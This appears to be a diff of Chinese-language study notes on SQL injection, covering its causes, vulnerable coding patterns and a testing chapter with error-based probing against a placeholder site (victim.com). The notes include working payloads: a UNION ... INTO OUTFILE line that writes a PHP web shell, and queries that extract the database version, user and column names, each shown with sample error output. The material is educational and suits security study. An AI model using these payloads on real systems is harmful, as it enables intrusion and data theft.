@@ -1,13 +1,17 @@
 第一章 什么是SQL injection
 是一种通过影响SQL请求不经授权来获得、修改、删除数据库信息的漏洞。最早是在1998年由Rain Forest Puppy发表的文章“NT Web Technology Vulnerabilities”中出现。 
 这种影响包括在应用参数输入中插入或拼接SQL命令来改变输入内容，而后由后台数据库解析执行。这种改变并不符合应用的原定设计逻辑，并可以暴露数据库内所有信息。
+SQL注入漏洞发生的原因是：
+1. 缺少用户输入过滤或过滤不足，让恶意参数可以通过。
+2. 数据和控制信息混合在一起，并能同时得到执行。
+
 资源OWASP, Zone-H
 可能引起SQL注入的场景：
 1. Dynamic String Bulding. 通过字符串操作动态组装SQL命令，通过输入参数注入恶意内容。parameterized queries可以防止类似问题。
 2. Incorrectly Handled Escape Characters. 通过使用' 来测试攻击对象是否可能存在sql注入漏洞。其他特殊字符也有可能导致类似问题，例如oracle里的空格、||, . */ "。
 3. Incorrectly Handled Types. 直接在不使用'字符的语句中使用UNION语句来接入另外的SQL语句。
 特殊例子，使用语句 UNION SELECT “<? system($_REQUEST[‘cmd’]); ?>” INTO OUTFILE “/var/www/html/victim.com/cmd.php” -- 来向php文件中写入remote shell。
-4. Incorrectly Handled Query Assembly. 在代码中利用参数指定所要操作的数据库表来动态组装SQL，并第一类更灵活。攻击者可以利用参数来直接指定SQL语句操作哪些数据内容而不仅限于特定的数据库表。
+4. Incorrectly Handled Query Assembly. 在代码中利用参数指定所要操作的数据库表来动态组装SQL，比第一类更灵活。攻击者可以利用参数来直接指定SQL语句操作哪些数据内容而不仅限于特定的数据库表。
 5. Incorrectly Handled Errors. 代码直接将数据库错误返回到用户界面，从而暴露数据库内容。例如SELECT * FROM table WHERE ID=' and 1 in (SELECT @@version) --
 6. Incorrectly Handled Multiple Submissions. 在连续多个列表提交中，攻击者可以跳过前面的步骤直接通过URL调用后面的列表提交操作，通常后面没有太多限制。
 http://www.victim.com/form.php?form=form2&param=' SQL Success --
@@ -25,3 +29,49 @@ SELECT name FROM sysobjects WHERE xtype = 'U';
 -- views
 SELECT name FROM sys.tables;
 
+第二章 测试SQL注入攻击
+攻击方式就是使用异常数据作为输入来触发程序运行异常：发现所有Web应用的数据入口，了解什么样的输入可能触发异常，从服务返回中发现异常。
+攻击的首要问题是了解数据库类型和版本。
+攻击点：GET request, POST request, Cookie, Host, Referer, User-Agent.
+攻击方法：控制URL参数。php参数
+tips:
+如果输入如下URL可以得到相同的回复，则说明可能存在SQL注入的漏洞：
+SQL Server & Oracle:
+http://www.victim.com/showproducts.php?category=bikes
+http://www.victim.com/showproducts.php?category=bi'+'kes
+MySQL:
+http://www.victim.com/showproducts.php?category=bikes
+http://www.victim.com/showproducts.php?category=bi' 'kes
+
+SQL错误会返回并出现在哪里：
+1. 返回到页面并且用户可见
+2. 返回到页面并且页面代码内可见
+3. 转到其他错误页面
+4. 返回500或302
+5. 无任何页面返回信息或只有通用信息。
+
+利用错误信息了解系统SQL server errors:
+请求：http://www.victim.com/showproducts.aspx?category=attacker'
+Server Error in '/' Application. Unclosed quotation mark before the character string 'attacker;'. Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information
+about the error and where it originated in the code. Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark before the character string 'attaker;'.
+请求：http://www.victim.com/showproduct.aspx?id=attacker
+Server Error in '/' Application. Invalid column name 'attacker'. Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information
+about the error and where it originated in the code. Exception Details: System.Data.SqlClient.SqlException: Invalid column name 'attacker'.
+请求显示数据库版本：http://www.victim.com/showproducts.aspx?category=bikes' and 1=0/@@version;--
+Server Error in '/' Application. Syntax error converting the nvarchar value 'Microsoft SQL Server 2000 – 8.00.760 (Intel X86) Dec 17 2002 14:22:05 Copyright (c) 1988-2003 Microsoft
+Corporation Enterprise Edition on Windows NT 5.2 (Build 3790: ) ' to a column of data type int.
+请求显示用户名：http://www.victim.com/showproducts.aspx?category=bikes' and 1=0/user;--
+Syntax error converting the nvarchar value 'dbo' to a column of data type int.
+请求显示数据库字段信息：
+1.http://www.victim.com/showproducts.aspx?category=bikes' having 1'='1
+Server Error in '/' Application. Column 'products.productid' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.
+2.http://www.victim.com/showproducts.aspx?category=bikes' GROUP BY productid having '1'='1
+Server Error in '/' Application. Column 'products.name' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+3.http://www.victim.com/showproducts.aspx?category=bikes' GROUP BY productid,name having '1'='1
+Server Error in '/' Application. Column 'products.price' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+4.http://www.victim.com/showproducts.aspx?category=bikes' and 1=0/name;--
+Server Error in '/' Application. Syntax error converting the nvarchar value 'Claud Butler Olympus D2' to a column of data type int.
+
+mysql errors:
+1. Warning: mysql_fetch_assoc(): supplied argument is not a valid MySQL result
+2. You have an error in your SQL syntax;
